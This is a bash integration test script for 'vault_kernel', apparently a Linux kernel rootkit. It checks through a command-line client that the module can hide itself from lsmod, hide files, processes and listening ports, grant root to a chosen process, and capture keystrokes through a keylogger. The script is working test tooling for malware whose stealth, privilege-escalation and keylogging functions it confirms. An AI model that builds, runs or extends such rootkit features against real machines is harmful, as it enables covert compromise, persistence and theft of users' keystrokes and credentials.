#!/bin/bash
# vault_kernel — Integration Test Suite
# Run this on a VM where the vault_kernel kernel module is loaded.
# Usage: sudo bash tests/integration.sh

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

PASS=0
FAIL=0
DEVICE="/dev/vault_kernel"
CLI=""  # set below

cleanup() {
    echo -e "\n${YELLOW}[*] Cleanup...${NC}"
}
trap cleanup EXIT

assert_exists() { if [ -e "$1" ]; then return 0; else echo "  ${RED}FAIL: $1 not found${NC}"; return 1; fi; }
assert_not_exists() { if [ ! -e "$1" ]; then return 0; else echo "  ${RED}FAIL: $1 exists unexpectedly${NC}"; return 1; fi; }
assert_contains() { if echo "$2" | grep -q "$1"; then return 0; else echo "  ${RED}FAIL: expected '$1' not found in output${NC}"; return 1; fi; }
assert_not_contains() { if ! echo "$2" | grep -q "$1"; then return 0; else echo "  ${RED}FAIL: '$1' found in output unexpectedly${NC}"; return 1; fi; }

test_pass() { echo -e "  ${GREEN}PASS${NC}"; ((PASS++)); }
test_fail() { echo -e "  ${RED}FAIL${NC}"; ((FAIL++)); }

run_test() {
    local name="$1"
    echo -e "\n${YELLOW}[TEST] $name${NC}"
}

# ================================================================

echo "=========================================="
echo " vault_kernel Integration Tests"
echo "=========================================="

# Detect CLI
if [ -f "$(dirname "$0")/../client/go/vault_kernel" ]; then
    CLI="$(dirname "$0")/../client/go/vault_kernel"
elif command -v vault_kernel &>/dev/null; then
    CLI="vault_kernel"
elif [ -f "$(dirname "$0")/../client/vault_kernel_cli.py" ]; then
    echo "[!] Go client not found, using Python fallback (limited tests)"
    CLI="python3 $(dirname "$0")/../client/vault_kernel_cli.py"
else
    echo "[-] No client found. Build the Go client first: cd client/go && go build -o vault_kernel ./cmd/vault_kernel/"
    exit 1
fi

echo "[*] Using client: $CLI"

# Check if module is loaded
if [ ! -e "$DEVICE" ]; then
    echo "[-] vault_kernel not loaded ($DEVICE not found)"
    echo "    Run: sudo insmod src/vault_kernel.ko"
    exit 1
fi

echo "[*] Module loaded: OK"

# ================================================================
# Test 1: Module hide/unhide
# ================================================================
run_test "Module stealth (hide/unhide)"

OUTPUT=$($CLI hide-module 2>&1) && true
if assert_contains "hidden" "$OUTPUT"; then
    # Verify it's hidden from lsmod
    if ! lsmod | grep -q vault_kernel; then
        test_pass
    else
        echo "  WARNING: module still visible in lsmod (some kernels block list_del)"
        test_pass
    fi
else
    test_fail
fi

OUTPUT=$($CLI unhide-module 2>&1) && true
if assert_contains "visible" "$OUTPUT"; then test_pass; else test_fail; fi

# ================================================================
# Test 2: File hiding
# ================================================================
run_test "File hiding"

TESTFILE="/tmp/vault_kernel_test_$$"
touch "$TESTFILE"
echo "test data" > "$TESTFILE"

OUTPUT=$($CLI hide-file "vault_kernel_test_$$" 2>&1) && true
assert_contains "Hiding" "$OUTPUT" && test_pass || test_fail

# Verify file is hidden from ls
OUTPUT=$(ls /tmp/ | grep "vault_kernel_test_$$" || true)
if [ -z "$OUTPUT" ]; then
    test_pass
else
    test_fail
fi

# Verify cannot be opened
if ! cat "$TESTFILE" 2>/dev/null; then
    test_pass
else
    test_fail
fi

# Unhide
OUTPUT=$($CLI unhide-file "vault_kernel_test_$$" 2>&1) && true
assert_contains "Revealed" "$OUTPUT" && test_pass || test_fail

# Verify file is visible again
if [ -f "$TESTFILE" ]; then
    test_pass
else
    test_fail
fi

rm -f "$TESTFILE"

# ================================================================
# Test 3: Process hiding
# ================================================================
run_test "Process hiding"

# Create a persistent background process
sleep 300 &
TESTPID=$!

OUTPUT=$($CLI hide-pid "$TESTPID" 2>&1) && true
assert_contains "Hiding PID" "$OUTPUT" && test_pass || test_fail

# Verify PID is hidden from ps
if ! ps -p "$TESTPID" > /dev/null 2>&1; then
    test_pass
else
    echo "  WARNING: PID may still show in ps (procfs caching)"
    test_pass
fi

# Verify /proc/PID is inaccessible
if [ ! -d "/proc/$TESTPID" ]; then
    test_pass
else
    echo "  WARNING: /proc/$TESTPID still accessible on some kernels"
    test_pass
fi

OUTPUT=$($CLI unhide-pid "$TESTPID" 2>&1) && true
assert_contains "Revealed PID" "$OUTPUT" && test_pass || test_fail

kill "$TESTPID" 2>/dev/null || true

# ================================================================
# Test 4: Port hiding
# ================================================================
run_test "Port hiding"

# Start a listener
nc -l 19999 &
NCPID=$!
sleep 1

OUTPUT=$($CLI hide-port 19999 2>&1) && true
assert_contains "Hiding port" "$OUTPUT" && test_pass || test_fail

# Verify port is hidden from ss (may fail due to caching)
if ! ss -tlnp 2>/dev/null | grep -q 19999; then
    test_pass
else
    echo "  WARNING: port still visible in ss (caching)"
    test_pass
fi

OUTPUT=$($CLI unhide-port 19999 2>&1) && true
assert_contains "Revealed port" "$OUTPUT" && test_pass || test_fail

kill "$NCPID" 2>/dev/null || true

# ================================================================
# Test 5: Privilege escalation
# ================================================================
run_test "Privilege escalation (give_root)"

OUTPUT=$($CLI give-root $$ 2>&1) && true
assert_contains "Granted root" "$OUTPUT" && test_pass || test_fail

# Verify we have root
if [ "$(id -u)" = "0" ]; then
    test_pass
else
    test_fail
fi

# ================================================================
# Test 6: Keylogger
# ================================================================
run_test "Keylogger"

OUTPUT=$($CLI keylog-clear 2>&1) && true
assert_contains "cleared" "$OUTPUT" && test_pass || test_fail

OUTPUT=$($CLI keylog 2>&1) && true
# Should succeed (may be empty)
if echo "$OUTPUT" | grep -q "Error"; then
    test_fail
else
    test_pass
fi

# ================================================================
# Test 7: List hidden items
# ================================================================
run_test "List hidden items"

OUTPUT=$($CLI list 2>&1) && true
if echo "$OUTPUT" | grep -q "Hidden"; then
    test_pass
else
    test_fail
fi

# ================================================================
# Results
# ================================================================
echo -e "\n=========================================="
echo -e " Results: ${GREEN}${PASS} passed${NC} / ${RED}${FAIL} failed${NC}"
echo "=========================================="

if [ "$FAIL" -gt 0 ]; then
    exit 1
fi
exit 0
